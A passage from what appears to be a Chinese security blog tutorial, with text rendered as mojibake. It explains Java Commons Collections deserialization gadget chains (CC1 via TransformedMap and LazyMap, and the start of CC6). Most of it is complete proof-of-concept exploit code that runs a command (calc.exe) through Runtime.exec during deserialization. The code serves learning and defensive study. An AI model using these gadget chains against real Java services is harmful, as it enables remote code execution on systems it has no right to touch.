class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">        <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> newChainedTransformer(transformers);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    innerMap.put(<span class="string">&quot;godown&quot;</span>,<span class="string">&quot;buruheshen&quot;</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,transformerChain);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">    oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶å®åˆ°è¿™é‡Œé€»è¾‘ä¸Šå·²ç»å¾ˆåˆç†äº†ã€‚ä½†æ˜¯è¿˜æ²¡æœ‰è§£é‡Šä¸ºä»€ä¹ˆåå°„ç”ŸæˆAnnotationInvocationHandlerå¯¹è±¡objçš„æ—¶å€™å‘æ„é€ å‡½æ•°ä¼ çš„å‚æ˜¯Retention.classã€‚è¿™æ˜¯å› ä¸ºåœ¨é€šå¾€setValueçš„æ—¶å€™é‡åˆ°äº†é—®é¢˜ï¼Œåœ¨AnnotationInvocationHandlerçš„readObjectæ—¶éœ€è¦ç»è¿‡ä¸€ä¸ªifåˆ¤æ–­æ‰èƒ½ç»§ç»­setValueã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line"><span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡è¿™ä¸ªifåˆ¤æ–­çš„æ¡ä»¶å°±æ˜¯</p><p>â€‹1.AnnotationInvocationHandleræ„é€ å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Annotationå­ç±»ä¸”åŒ…å«è‡³å°‘ä¸€ä¸ªæ–¹æ³•ï¼Œå‡è®¾ä¸ºXã€‚</p><p>â€‹2.TransformedMap.decorateç»‘å®šçš„Mapä¸­æœ‰ä¸€ä¸ªXå…ƒç´ </p><p>Retention.classå°±ç¬¦åˆå­ç±»å’Œè‡³å°‘ä¸€ä¸ªæ–¹æ³•çš„æ¡ä»¶ã€‚æ–¹æ³•å«valueï¼Œæ‰€ä»¥<code>innerMap.put(&quot;value&quot;,&quot;buruheshen&quot;);</code></p><p>å®Œæ•´payloadå°±æ˜¯æ”¹ä¸€ä¸‹putå…ƒç´ ,åœ¨æœ€åreadobjectåºåˆ—åŒ–å¯¹è±¡è§¦å‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;buruheshen&quot;</span>);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,transformerChain);</span><br><span class="line">                <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">                construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">                oos.writeObject(obj);</span><br><span class="line">                oos.close();</span><br><span class="line"></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æµ‹è¯•å›¾ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221118220422652.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221118220422652.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="LazyMap-ååºåˆ—åŒ–é“¾"><a href="#LazyMap-ååºåˆ—åŒ–é“¾" class="headerlink" title="$LazyMap$ååºåˆ—åŒ–é“¾"></a>$LazyMap$ååºåˆ—åŒ–é“¾</h2><p>ä¸Šè¿°ååºåˆ—åŒ–é“¾æ˜¯ç”±TransformMapæ­é…AnnotationInvocationHandlerçš„readObjectä¿®æ”¹Mapè§¦å‘ï¼Œå…¶ä¸­æœ€åä¸€æ­¥å°±æ˜¯setValueã€‚ä¸é€šè¿‡setValueè§¦å‘ä¹Ÿæ˜¯å¯ä»¥çš„æã€‚</p><p>LazyMap.decorateç»‘å®šçš„Mapï¼Œåœ¨getæ‰¾ä¸åˆ°å€¼æ—¶ä¼šè§¦å‘transformã€‚AnnotationInvocationHandleræœ‰setValueä½†æ˜¯æ²¡æœ‰getæ–¹æ³•ï¼Œä¸è¿‡è¯¥ç±»ä¸‹çš„invokeæ–¹æ³•æœ‰getè°ƒç”¨ã€‚ç”¨åˆ°<code>java.reflect.Proxy</code>è§¦å‘Invokeã€‚è€Œè§¦å‘çš„å…·ä½“åŸç†å¯ä»¥å‚è€ƒï¼š<code>https://www.jianshu.com/p/774c65290218</code>ã€‚ç†è§£ä¸äº†ä¹Ÿæ²¡äº‹ï¼Œåªéœ€è¦çŸ¥é“Proxyä»£ç†èƒ½è§¦å‘é‡å†™çš„InvocationHandlerã€‚</p><p> <img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119120313598.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119120313598.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>LazyMapçš„CCé“¾ååºåˆ—åŒ–æµç¨‹ï¼š</p><ol><li><p>transfromChainçš„é“¾ä¸€æ ·ï¼Œç»‘å®šåˆ°lazyMapä¸Šã€‚</p><p><code>Map outerMap = LazyMap.decorate(innerMap, transformerChain);</code></p></li><li><p>åå°„å¾—åˆ°AnnotationInvocationHandleræ„é€ å‡½æ•°ï¼Œä¼ å…¥outMapå®ä¾‹åŒ–å¯¹è±¡ã€‚è°ƒç”¨outMapéœ€è¦getè·å–å€¼</p></li><li><p>å€ŸåŠ©proxyå¯¹è±¡ä»£ç†ï¼Œè‡ªåŠ¨è°ƒç”¨AnnotationInvocationHandlerçš„invokeçš„getæ–¹æ³•ã€‚</p></li></ol><p>ä¸Šè¿°ä»£ç åªéœ€è¦ä¿®æ”¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class,outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,handler);</span><br><span class="line">handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><p>æœ€åè¦å†å®ä¾‹åŒ–çš„åŸå› æ˜¯å…¥å£ç‚¹æ˜¯AnnotationInvocationHandlerçš„readObjectï¼Œè€Œproxyæ˜¯Mapå¯¹è±¡ï¼Œå…¥å£ä¸å¯¹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119135414510.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119135414510.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ­£å¸¸æ‰§è¡Œæ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ˜¯åœ¨è°ƒè¯•æ—¶å¯èƒ½ä¼šå¼¹ä¸¤éç”šè‡³æ˜¯ä¸‰éè®¡ç®—å™¨ã€‚æ ¹æ®ä¸Šé¢çš„å¯¹è±¡ä»£ç†çŸ¥é“Proxyä»£ç†äº†mapå¯¹è±¡(Map proxyMapå®šä¹‰å)ï¼Œæ‰§è¡Œä¸€émapå°±ä¼šè§¦å‘ä¸€épayloadã€‚å¯ä»¥å­¦ä¹ ysoserialå…ˆnew ChainedTransformerå‡æ•°ç»„ï¼Œæœ€åå†åˆ©ç”¨getDeclaredFieldè·å–ç§æœ‰æ–¹æ³•iTransformersï¼ŒæŠŠçœŸæ­£çš„Transformeræ•°ç»„è®¾ç½®è¿›å»</p><p>å®Œæ•´çš„pocï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);<span class="comment">//å…ˆç»‘å®šå‡transform</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class,outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,handler);</span><br><span class="line">        handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é«˜ç‰ˆæœ¬CC6"><a href="#é«˜ç‰ˆæœ¬CC6" class="headerlink" title="é«˜ç‰ˆæœ¬CC6"></a>é«˜ç‰ˆæœ¬CC6</h2><p>å†æƒ³ä¸€écc1åˆ©ç”¨AnnotationInvocationHandlerçš„åŸå› ï¼Œæ˜¯å› ä¸ºAnnotationInvocationHandlerå¯ä»¥putæˆ–è€…getåŸmapå¯¹è±¡ï¼Œä»è€Œè§¦å‘transformã€‚åœ¨é«˜ç‰ˆæœ¬æ—¶è¿›è¡Œäº†ä¿®å¤ï¼Œè¯¥ç±»çš„readObjectå¤åˆ¶äº†ä¸€ä»½linkedHashMapå¯¹è±¡ï¼Œè€Œä¸æ˜¯ç›´æ¥ç”¨ä¼ å…¥çš„å¯¹è±¡ï¼Œè‡ªç„¶ä¹Ÿå°±ä¸èƒ½è§¦å‘transform</p><p>é‚£å°±ç›´æ¥ä¸ç”¨AnnotationInvocationHandleräº†ï¼Œä»–ä¸ç»™æˆ‘ä»¬ç”¨å°±ä¸æƒ¯ç€å®ƒï¼Œåœ¨<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>ä¸­hashcodeè°ƒç”¨äº†getValueæ–¹æ³•ï¼ŒgetValueè°ƒç”¨äº†map.getã€‚æ‰€ä»¥åªéœ€è¦æ‰¾åˆ°hashcodeçš„è°ƒç”¨</p><ul><li><p>ysoserialæ˜¯â½¤<code>java.util.HashSet#readObject</code>åˆ°<code>HashMap#put()</code>åˆ° <code>HashMap#hash(key)</code>æœ€ååˆ° <code>TiedMapEntry#hashCode()</code></p></li><li><p>pç¥æ˜¯<code>java.util.HashMap#readObject</code> åˆ°<code> HashMap#hash()</code>åˆ°<code>TiedMapEntry#hashCode()</code></p></li></ul><p>HashMapçš„éƒ¨åˆ†å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">     <span class="type">int</span> h;</span><br><span class="line">     <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">     s.defaultReadObject();</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">         <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">         <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">         <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">         <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">         putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>readObjectè°ƒç”¨äº†hash(key)ï¼Œhash(key)åˆè°ƒç”¨äº†hashcodeã€‚æ‰€ä»¥key&#x3D;&#x3D;TieMapEntryå¯¹è±¡æ—¶ï¼Œæ„æˆGadget</p><p>æ„é€ ååºåˆ—åŒ–é“¾æµç¨‹ï¼š</p><ol><li><p>æ„é€ lazyMapï¼Œå’Œå‰é¢çš„lazyMapä¸€æ ·</p><p><code>Map outerMap = LazyMap.decorate(innerMap, transformerChain);</code></p></li><li><p>æŠŠlazyMapçš„å¯¹è±¡ä½œä¸ºTieMapEntryçš„mapå±æ€§ï¼Œæ”¾å…¥æ„é€ å‡½æ•°</p><p><code>TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);</code></p></li><li><p>å°†temä½œä¸ºHashMapçš„ä¸€ä¸ªkeyã€‚è¿™æ ·å°±èƒ½è°ƒç”¨åˆ°hash(key)-&gt;hashcodeäº†ã€‚lazyMapé‚£é‡Œè¦ç”¨åˆ°ä¸€ä¸ªHashMapï¼Œå› 